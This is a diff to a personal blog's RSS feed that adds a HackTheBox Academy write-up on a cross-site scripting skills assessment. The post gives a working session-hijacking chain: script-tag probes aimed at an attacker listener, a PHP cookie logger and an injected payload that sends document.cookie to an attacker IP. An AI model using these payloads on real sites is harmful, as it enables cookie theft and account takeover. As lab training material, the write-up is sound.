@@ -1,4 +1,46 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>.:: Alan Cortez</title><description>Personal Site</description><link>https://alan.com.ar/</link><language>en</language><item><title>Skills Assessment - JavaScript Deobfuscation - HackTheBox.</title><link>https://alan.com.ar/posts/javascriptdeobfuscation/</link><guid isPermaLink="true">https://alan.com.ar/posts/javascriptdeobfuscation/</guid><pubDate>Thu, 23 Oct 2025 03:24:52 GMT</pubDate><content:encoded>&lt;blockquote&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>.:: Alan Cortez</title><description>Personal Site</description><link>https://alan.com.ar/</link><language>en</language><item><title>Skills Assessment - Cross-Site Scripting - HackTheBox.</title><link>https://alan.com.ar/posts/cross-site-scripting-htb/</link><guid isPermaLink="true">https://alan.com.ar/posts/cross-site-scripting-htb/</guid><pubDate>Sun, 16 Nov 2025 03:24:52 GMT</pubDate><content:encoded>&lt;blockquote&gt;
+&lt;p&gt;This module will teach you how to identify XSS vulnerabilities and exploit them.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&quot;https://academy.hackthebox.com/module/details/103&quot;&gt;Link to the module&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2&gt;Cross-Site Scripting - Skills Assessment&lt;/h2&gt;
+&lt;p&gt;We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new &lt;code&gt;Security Blog&lt;/code&gt;. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).&lt;/p&gt;
+&lt;p&gt;Start the server below, make sure you are connected to the VPN, and access the &lt;code&gt;/assessment&lt;/code&gt; directory on the server using the browser:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_skills_assessment_website.jpg&quot; alt=&quot;https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_skills_assessment_website.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Apply the skills you learned in this module to achieve the following:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Identify a user-input field that is vulnerable to an XSS vulnerability&lt;/li&gt;
+&lt;li&gt;Find a working XSS payload that executes JavaScript code on the target&apos;s browser&lt;/li&gt;
+&lt;li&gt;Using the &lt;code&gt;Session Hijacking&lt;/code&gt; techniques, try to steal the victim&apos;s cookies, which should contain the flag&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr /&gt;
+&lt;p&gt;First we need to test which is the vulnerable field. I tried&lt;br /&gt;
+&lt;code&gt;&amp;lt;script src=http://IP:PORT/name&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;&amp;lt;script src=http://IP:PORT/comment&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;br /&gt;
+and so on, while listening to the port, using&lt;br /&gt;
+&lt;code&gt;sudo nc -lvnp PORT&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Once the vulnerable field was found, I made the index.php file using the example seen in the module:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+if (isset($_GET[&apos;c&apos;])) {
+    $list = explode(&quot;;&quot;, $_GET[&apos;c&apos;]);
+    foreach ($list as $key =&amp;gt; $value) {
+        $cookie = urldecode($value);
+        $file = fopen(&quot;cookies.txt&quot;, &quot;a+&quot;);
+        fputs($file, &quot;Victim IP: {$_SERVER[&apos;REMOTE_ADDR&apos;]} | Cookie: {$cookie}\n&quot;);
+        fclose($file);
+    }
+}
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I also made the script.js file, as seen prevously:&lt;br /&gt;
+&lt;code&gt;new Image().src=&apos;http://0.10.14.223:8089/index.php?c=&apos;+document.cookie&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Finally I set up the PHP server using&lt;br /&gt;
+&lt;code&gt;sudo php -S 0.0.0.0:PORT&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;And used the payload in the vulnerable field:&lt;br /&gt;
+&lt;code&gt;&amp;lt;script src=http://10.10.14.223:8089/script.js&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;This gave as the cookie and the flag.&lt;/p&gt;
+</content:encoded></item><item><title>Skills Assessment - JavaScript Deobfuscation - HackTheBox.</title><link>https://alan.com.ar/posts/javascriptdeobfuscation/</link><guid isPermaLink="true">https://alan.com.ar/posts/javascriptdeobfuscation/</guid><pubDate>Thu, 23 Oct 2025 03:24:52 GMT</pubDate><content:encoded>&lt;blockquote&gt;
 &lt;p&gt;In this module, you will learn the basics of deobfuscating and decoding JavaScript code and will have several exercises to practice what you learned.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;blockquote&gt;
